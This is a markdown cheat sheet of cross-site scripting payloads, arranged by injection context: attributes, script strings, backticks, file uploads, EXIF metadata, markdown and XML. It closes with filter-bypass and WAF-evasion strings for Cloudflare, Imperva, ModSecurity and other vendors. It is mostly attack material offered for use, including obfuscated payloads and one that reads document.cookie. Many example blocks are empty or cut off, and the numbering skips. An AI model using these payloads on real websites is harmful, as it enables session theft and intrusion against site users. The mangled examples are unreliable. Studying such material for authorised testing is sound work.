# XSS Cheat Sheet (Basic)
## Introduction
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into websites. There is 3 types of XSS Attack:
- Reflected XSS
    Attack where the malicious script runs from another website through the web browser    
- Stored XSS
    Stored attacks are those where the injected script is permanently stored on the target servers
- DOM-Based XSS
    A type of XSS that has payloads found in the DOM rather than within the HTML code.
## Where to find
This vulnerability can appear in all features of the application. If you want to find Dom-based XSS, you can find it by reading the javascript source code.
## How to exploit
1. Basic payload
```html
```
2. Add ' or " to escape the payload from value of an HTML tag
```html
">
'> 
```
* Example source code
```html
```
* After input the payload
```html
```
3. Add --> to escape the payload if input lands in HTML comments.
```html
-->
```
* Example source code
```html
```
* After input the payload
```html
 -->
```
4. Add  when the input inside or between opening/closing tags, tag can be ```,,``` and any other HTML tags
```html
">
```
* Example source code
```html
1
```
* After input the payload
```html
">1
```
5. Use when input inside an attribute’s value of an HTML tag but > is filtered
```html
" onmouseover=alert(1)
" autofocus onfocus=alert(1)
```
* Example source code
```html
```
* After input the payload
```html
```
6. Use  when input inside ```
```
* Example source code
```html
```
* After input the payload
```html
';
```
## **XSS Cheat Sheet (Advanced)**
7. Use when input lands in a script block, inside a string delimited value.
```html
'-alert(1)-'
'/alert(1)//
```
* Example source code
```html
```
* After input the payload
```html
```
8. Same like Number 7. But inside a string delimited value but quotes are escaped by a backslash.
```html
\'alert(1)//
```
* Example source code
```html
```
* If we input payload '-alert(1)-' it will be like this
```html
```
The quotes are escaped by a backslash so we need to bypass them
* After input the payload
```html
```
9. Use when there’s multi reflection in the same line of JS code
```html
/alert(1)//\
/alert(1)}//\
```
* Example source code
```html
```
* After input the payload
```html
```
10. Use when input inside a string delimited value and inside a single logical block like function or conditional (if, else, etc).
```html
'}alert(1);{'
\'}alert(1);{// 
```
* Example source code
```html
    var greeting;
    var time = 1;
    if (time 
```
* After input the payload
```html
    var test;
    var time = 1;
    if (time 
```
> Payload number 2 uses when quote escaped by backslash
11. Use when input lands inside backticks delimited strings
```html
${alert(1)}
```
* Example source code
```html
```
* After input the payload
```html
```
12. Uses when there is multiple reflections on same page. (Double Reflection)
```html
'onload=alert(1)>alert(1)/*
```
* After input the payload
```html
'onload=alert(1)>
```
13. Uses when there is multiple reflections on same page. (Triple Reflection)
```html
*/alert(1)">'onload="/*'onload="`'>alert(1)/*
*/alert(1)">'onload="/*'onload="/*'onload="/*
```
14. XSS in filename (File Upload) Use when uploaded filename is reflected somewhere in target page
```
">.jpeg
```
15. XSS in metadata (File Upload) Use when uploaded metada is reflected somewhere in target page (using exiftool)
```
$ exiftool -Artist='">' dapos.jpeg
```
16. XSS with SVG file (File Upload)
```
```
17. XSS via markdown
```
[Click Me](javascript:alert('1'))
```
18. XSS in XML page
```
alert(1)
```
> Add a "-->" to payload if input lands in a comment section
> Add a "]]>" if input lands in a CDATA section
## **XSS Cheat Sheet (Bypass)**
19. Mixed Case
```html
```
20. Unclosed Tags
```html
```
22. Encoded XSS
```html
(Encoded)
%3Csvg%20onload%3Dalert(1)%3E 
(Double Encoded)
%253Csvg%2520onload%253Dalert%281%29%253E 
(Triple Encoded)
%25253Csvg%252520onload%25253Dalert%25281%2529%25253E 
```
23. JS Lowercased Input
```html
```
24. PHP Email Validation Bypass
```html
"@gmail.com
```
25. PHP URL Validation Bypass
```html
javascript://%250Aalert(1)
```
26. Inside Comments Bypass
```html
```
## Bypass WAF
1. Cloudflare
```
">
%2sscript%2ualert()%2s/script%2u
"Onx=() onMouSeoVer=prompt(1)>"Onx=[] onMouSeoVer=prompt(1)>"/*/Onx=""//onfocus=prompt(1)>"//Onx=""/*/%01onfocus=prompt(1)>"%01onClick=prompt(1)>"%2501onclick=prompt(1)>"onClick="(prompt)(1)"Onclick="(prompt(1))"OnCliCk="(prompt`1`)"Onclick="([1].map(confirm))
[1].map(confirm)'ale'+'rt'()a&Tab;l&Tab;e&Tab;r&Tab;t(1)prompt&lpar;1&rpar;prompt&#40;1&#41;prompt%26%2300000000000000000040;1%26%2300000000000000000041;(prompt())(prompt``)
 --!>
{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](document.domain)">
H#x
'">;prompt`${document.domain}`%26lt;/script>'>
'">
:javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
```
2. Cloudfront
```
">%0D%0A%0D%0A
 --!>
">> --!>
```
3. Cloudbric
```
pew
```
4. Comodo WAF
```
dragme
```
5. ModSecurity
```
```
6. Imperva
```
clickme
click
pew
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
```
7. AWS
```
```
If you want to see the other payload for other WAF, check this [link](https://github.com/0xInfection/Awesome-WAF)
## References
- [Brute Logic](https://brutelogic.com.br/)
- [Awesome-WAF](https://github.com/0xInfection/Awesome-WAF)
- Some random twitter posts